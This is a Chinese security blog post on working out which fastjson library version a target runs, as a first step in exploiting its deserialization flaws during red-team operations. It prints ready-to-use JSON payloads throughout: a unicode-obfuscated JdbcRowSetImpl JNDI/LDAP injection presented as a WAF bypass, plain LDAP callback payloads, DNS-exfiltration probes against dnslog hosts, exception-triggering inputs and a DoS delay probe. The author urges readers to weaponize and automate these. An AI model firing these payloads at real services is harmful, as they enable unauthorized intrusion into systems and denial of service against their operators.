<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5mO1L5o8j_m6RYM6nO-pAA)

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ATcz6jUJnFNeOxRzVZ9LbcCCMJ6Af2WYicgMPA32IwibF8mI2ibC9h8jaHkhxnZzZuqctMLRTxDudicA/640?wx_fmt=png)

 **Part1 前言** 

最近几天一直在审计 Java 漏洞，周六周天也没休息，所以上周文章就没写，今天抽空写一篇文章补上。在最近几年的攻防比赛、红队评估项目、渗透测试中，fastjson 反序列化漏洞是一个非常常见的漏洞，和 shiro 反序列化漏洞一样，几乎每次比赛都能遇到，很多白帽子、攻击队队员都用这个漏洞拿到过权限。

对于 fastjson 反序列化漏洞的利用，**第一步要做的事情，就是想办法去判断 fastjson 的版本号**，因为不同版本的 fastjson 漏洞利用方式有所不同，比如说早期的版本 1.2.x、后期的 1.2.47 之前版本、后期的 1.2.68 之前版本、最新的 1.2.80 版本漏洞等等。如果不能区分版本号的话，那就只能把各种 POC 批量打一圈了，这样做也无可厚非，但是在实战过程中，一旦漏洞利用不成功，很难准确判断原因是什么，可能是因为 waf 原因，可能是 fastjson 版本过低或者过高，可能是有 openrasp 在等等，无法对症下药。所以，这篇文章就分享一下，如何大致区分 fastjson 版本号，以便于更快地在实战中对 fastjson 反序列化漏洞进行研判。

 **Part2 技术研究过程** 

*   **判断方法分类**
    

根据以往 ABC_123 开发 Struts2 漏洞工具、Weblogic 反序列化漏洞工具的经验，判断漏洞是否存在，无非是以下几种方法：

 **1**  **显错判断**

想办法使服务器组件抛出异常，也就是报错，在报错中得到我们想要的信息。

 **2** **DNS 请求判断**

想办法触发一个 DNS 请求，前提是服务器出网，并且外围设备开放了 DNS 协议，然后你的 dnslog 服务地址没被监控设备拦截；

 **3** **TCP、UDP 端口请求判断**

**这里不止一个人问过我，用 DNS 请求直接判断就可以了，为啥还得用端口来判断呢？**这里我举一个例子，如果一个内网机器，它没配 DNS 的话，然后机器又是出网的，dnslog 是收不到请求的，那么只能 TCP 或者 UDP 来判断了，这种情况我遇到过好几次了）。

 **4** **延迟判断**

想办法使其触发一个延迟。可以执行 Java 的 sleep 代码，可以像 mysql 注入那样计算一个公式 bench.mark(5000000,m.d5( 'test'))，也可以发起一个轻微的 DoS 请求。5、其它方法，比较少见，而且不适用于本次 fastjson 漏洞检测，这里就不具体叙述了。

接下来讲一讲对于 fastjson 有哪些 POC 可以用来判断或者区分版本号。

*   **延迟判断**
    

先讲一下触发延迟的 2 个方法吧，应该说是两类方法，具体大家实战中自己发散思维。

 **1** **jndi 请求延迟**

首先看这个 payload，适用于 1.2.47 之前版本的 fastjson，这里面有一个小技巧，访问一个不常见的外网 IP 地址，会延迟几秒，访问一个内网地址 127.0.0.1 会瞬间返回，那么证明这个 POC 可用，也间接证明 fastjson 版本是 1.2.47 之前的版本。那么在不出网的情况下，可以借助这个 POC 的延迟效果，知道目标 fastjson 是 <=1.2.47 的，进而可以花时间和精力去构造 POC 实现回显，或者直接打一个内存马。

以下是一个经过 unicode 编码的 payload，一定程度上可以绕过一些 waf，**后续更多的 fastjson 绕 waf 方法，会专门写一篇文章讲解**。

{"name":{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073","\u0076\u0061\u006c":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"ldap://11.111.22.222/test111","autoCommit":true\}\}

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CicE8Wzye9OjtZmJTTGJ0FXeBsW6U2GqfobiaL5oZMTJia2bgRg9gDAwDdiacApdlXMFLqBqCGdMklaQ/640?wx_fmt=png)

以下这个 POC 延迟，证明 fastjson 版本号 **1.1.16<=version<=1.2.24**

{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://137.30.0.1:9999/POC","autoCommit":true\}\}

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CicE8Wzye9OjtZmJTTGJ0FX496r6eQMUFEpm5bsTwBuTeOt7KBJluyJYtVgeBU2PhSOWPo7JDgH5g/640?wx_fmt=png)

 **2** **DOS 漏洞触发延迟**

这个 POC 来自于浅蓝，POC 中的 aaa 的长度越长，触发延迟效果越明显，如果有延迟效果，那么证明 fastjson 版本 **<=1.2.59**，间接证明 fastjson 版本 <=1.2.68，这个非常重要，这说明，这个 fastjson 是有可能拿下权限的，值得我们在实战中花很多精力去研究它。

注：**此 POC 慎用，不确定是否会影响业务系统，我一般实战中，是逐步增加 a 的数量的，切不可生搬硬套，输入一大堆 a**

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CicE8Wzye9OjtZmJTTGJ0FX5QbEXe6RBOtfVvcf7cKclnJBqu6CNO81qksg57PrLrdNjOoHbwPuCA/640?wx_fmt=png)

*   **显错判断**
    

这个方法来自于浅蓝，两个 POC 如下，提交一下两个 POC，会抛出异常，有时候会显示出 fastjson 版本号来。

1. {"@type": "java.lang.AutoCloseable"

2. ["test":1] 

3. 输入一些乱码字符，让 web 应用报错，有时候也会带出来版本号。

第 2 个 POC 成功率不高，但是实战中成功过几次。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CicE8Wzye9OjtZmJTTGJ0FXSZdky7aUdfaX0abfoqsdpSnXe4U0P9pFPukGfPyQRCib4x5jS0nJ9zA/640?wx_fmt=png)

*   **DNS 请求判断**
    

我曾经搭建了不同的 fastjson 漏洞环境，发现网上很多文章对于各种 fastjson 漏洞 dnslog payload 与 fastjson 版本号的对应描述都不准确，很多还是有错误的。**这里我发出自己校勘的结果**，不一定准确，仅供大家参考。

以下 POC 出网，说明 fastjson<=1.2.47

{"name":{"@type":"java.net.InetAddress","val":"1247.xxxxx.dnslog.cn"\}\}

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CicE8Wzye9OjtZmJTTGJ0FX1zMKkZFp5EGrzwCT0ibvVoqiacV4yOL9yucTjEic7cPw9iaaxnqRlEUJuw/640?wx_fmt=png)

以下这个 POC 出网，说明 fastjson>=1.2.37

\{\{"@type":"java.net.URL","val":"http://weffewfddd.dnslog.cn"}:"aaa"}

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CicE8Wzye9OjtZmJTTGJ0FXQMf5qDLxF5JLQ504rB7SRW3m9x31vZYciaSJEnbdrJ86tIzHD1Cpbnw/640?wx_fmt=png)

以下这个 POC 出网，证明 fastjson 版本号 1.1.16<=version<=1.2.24

{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxxdsf.dnslog.cn:9999/POC","autoCommit":true\}\}

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CicE8Wzye9OjtZmJTTGJ0FXTjEyAuenPSuXPpsziagkK153ACicF1jvYIOyIuUmMYkHH6fXETNNAomw/640?wx_fmt=png)

**以下这几个 POC，只能证明 fastjson 出网，无法判断 fastjson 是否存在反序列化漏洞，因为最新的打了补丁的 fastjson 也是能发起 DNS 请求的**。这是很多新手，误以为能 DNS 出网，就认为存在 fastjson 漏洞，这是不正确的。

{"@type":"java.net.Inet6Address","val":"sdffsd.dnslog.cn"}

{"@type":"java.net.Inet4Address","val":"xxxxx.dnslog.cn"}

{"@type":"java.net.InetSocketAddress"{"address":,"val":"wefewffw.dnslog.cn"\}\}

以下这个 POC 比较不错，**是之前从天眼设备上抓到的**，实战中用一用会有意想不到的效果。

{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://allmet.dnslog.cn"\}\}""}

Set[{"@type":"java.net.URL","val":"http://allmet.dnslog.cn"}]

Set[{"@type":"java.net.URL","val":"http://allmet.dnslog.cn"}

\{\{"@type":"java.net.URL","val":"http://allmet.dnslog.cn"}:0

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450CicE8Wzye9OjtZmJTTGJ0FXlfia4mjef5vtKYLsTNhbUXIAf0AhriaEhWgHickojLLkv4U4icv0tNSw1g/640?wx_fmt=png)

 **Part3 总结** 

**1. ** 把以上的各种方法组合起来判断，写一个自动化 fuzz 工具，基本上大致可以判断出 fastjson 版本号的区间了，以便我们在实战中对症下药，快速拿下权限。

**2.**  上述的这些过程，部分同学可能无法理解，这么费心思的去判断 fastjson 版本号的意义何在？**台上一分钟，台下十年功，这样的总结为的就是在实战中快速拿下权限**，否则一次比赛 3、4 天，怼一个 fastjson 用了大半天时间，发现人家的版本是最新的，岂不白费功夫。还有可能一个 fastjson 反序列化漏洞，我们搞不定，但是发现别人搞定了，最后一咨询发现是 POC 是 1.2.68 的写文件拿下来的，但是我们却以为是最新版本，没有去尝试。

**3.**  还有很多 POC 可以用于 fastjson 版本判断，篇幅有限，就不一一列举了。大家可以按照上述思路自己总结出一套方法，**做成小脚本或自动化工具，向工具化、武器化、自动化、平台化迈进！**就很容易在实战中得到 fastsjon 版本号的区间，快速进行漏洞研判了。

**4.**  以上叙述如果有错误，欢迎大家批评指正。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rh3JHDibOKOop204nXz618iawdRb8dABicMPtHb2PkJE8x6koJO5HyuwZJQ/640?wx_fmt=png)

专注于网络安全技术分享，包括红队、蓝队、日常渗透测试、安全体系建设等

每周一篇，99% 原创，敬请关注

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rhn137KeqqlDkuRyY4G61jATRzyOrCBts8ucxkLpMNsYutSOY7BkPziaw/640?wx_fmt=jpeg)

**往期精彩回顾**

**[第 17 篇：Shiro 反序列化在 Weblogic 下无利用链的拿权限方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484319&idx=1&sn=9da36674830837aa9bcacb3fb6268fd1&chksm=c25fcce4f52845f2ac3cebaf17fd3839fdba74f536ad3da20d1b1126d8ba0e1835853990516c&scene=21#wechat_redirect)  
**

[第 16 篇：Weblogic 2019-2729 反序列化漏洞绕防护拿权限的实战过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484303&idx=1&sn=58cbb4d7f63b9276bb89eeac286d174c&chksm=c25fccf4f52845e241256c2f425003b73b6061b3d1964dcd4a184a2cda1b4d8761098227e6de&scene=21#wechat_redirect)

[第 15 篇：内网横向中 windows 各端口远程登录哈希传递的方法总结](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484255&idx=1&sn=e233aa07fdf9de0c8a1bf56fb0954766&chksm=c25fcc24f5284532c5aa27c002d15aa6380c456e2a84299c77b8d43a41892517087258bf867d&scene=21#wechat_redirect)

[第 14 篇：Struts2 框架下 Log4j2 漏洞检测方法分析与总结](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484207&idx=1&sn=285b54a79e48db9a05816cab2e6afc27&chksm=c25fcc54f5284542c1b9abe870e0caa9f958f4da90723bd83292deed215c63c705b7b0bbfaff&scene=21#wechat_redirect)  

[第 13 篇：coldfusion 反序列化过 waf 改 exp 拿靶标的艰难过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484191&idx=1&sn=cce12f62b3cf457bc73753b77a083695&chksm=c25fcc64f528457250b11ef6804ee6138c37ed87ab988874cc84d09d04fa6ac1fd36b5e8aa4a&scene=21#wechat_redirect)  

[第 12 篇：给任意 java 程序挂 Socks5 代理方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484173&idx=1&sn=e2d454d2447d119bf771a0a511fba994&chksm=c25fcc76f5284560d00355590da0147aca7b7ae2275c095424034245ef32b3d0b28e49c2dbc9&scene=21#wechat_redirect)  

[第 11 篇：盲猜包体对上传漏洞的艰难利用过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484162&idx=1&sn=870596fcd1120a6d3ee9688c38aace00&chksm=c25fcc79f528456f9dc0a3b9d9cf54422696a1cd6ffd737ae2c6e33941a25c33d4f6d32fc663&scene=21#wechat_redirect)  

[第 10 篇：IIS 短文件名猜解在拿权限中的巧用](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484145&idx=1&sn=7635430b9b759a2cacdd2c57ba330833&chksm=c25fcd8af528449c1f5c6c703e3668cf6a8dae875ee82ffa67caed66722a0751e3d80d8a6bee&scene=21#wechat_redirect)  

[第 9 篇：Shiro 反序列化数据包解密及蓝队分析工具，提供下载](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484123&idx=1&sn=cb9c039ef92311e56e7742c7c38f6e8a&chksm=c25fcda0f52844b6088b39b769a63b2f6e7a29e8b3ab710961918218d7569089ee4e00072ad9&scene=21#wechat_redirect)  

[第 8 篇：Oracle 注入漏洞绕 waf 的新语句](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484115&idx=1&sn=10c73343ec23f522696692293cd38852&chksm=c25fcda8f52844be2165aa6151c7ad018a4add748673d56523631529e903277633dc44d0abba&scene=21#wechat_redirect)  

[第 7 篇：MS12-020 蓝屏漏洞在实战中的巧用](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484105&idx=1&sn=3aeafa9c172588aaaade47ccacb69370&chksm=c25fcdb2f52844a4a783fceec590c9e12eb06f62dabd7fbffb37e8da23053953a7eae296048d&scene=21#wechat_redirect)  

[第 6 篇：Weblogic 反序列化攻击不依赖日志溯源攻击时间](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484094&idx=1&sn=527236759dc4fd228461195197492507&chksm=c25fcdc5f52844d36bffb96979116d6d3a9ae4fb1a0f320436c7275aea271588c702cea60e5c&scene=21#wechat_redirect)  

[第 5 篇：Shiro Padding Oracle 无 key 的艰难实战利用过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484091&idx=1&sn=4dcce59a842f17035d0018bf650671ae&chksm=c25fcdc0f52844d608b6b87d85082b74d5e15888e76001127ff40cc407a46e5e5de446b1365e&scene=21#wechat_redirect)  

[第 4 篇：jsp 型 webshell 被删情况下如何溯源攻击时间](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484004&idx=1&sn=50013b50e48542d156700d76ccbd2f33&chksm=c25fcd1ff528440906bb9089a807c16b747ab5a72cc0279a3c0d18a265cd76cc796df570d594&scene=21#wechat_redirect)  

[第 3 篇：银行 Java 站 SSRF"组合洞" 打法造成的严重危害](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247483984&idx=1&sn=1a018fcefe10124c1726e51a2be05ca7&chksm=c25fcd2bf528443d944a8495ca5c72d8c028fef67de217efe47a8d18b077ae24556842687407&scene=21#wechat_redirect)  

[第 2 篇：区分 Spring 与 Struts2 框架的几种新方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247483951&idx=1&sn=fbc1d04ef73a449238a5979a439b1f35&chksm=c25fcd54f528444219f20c2ab14c5970c243fbb10ba04b5bccc0fb0b7cc6d3f542e26f7870bf&scene=21#wechat_redirect)  

[第 1 篇：weblogic9.x 在 JDK1.5 下 T3 反序列化漏洞利用方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247483867&idx=1&sn=e0fcaa9f1b58c8085ccd9dc6f74ed336&chksm=c25fcea0f52847b6aeec0409e3290e023b890d603361f103315b39637f89a10dd6fe051dc724&scene=21#wechat_redirect)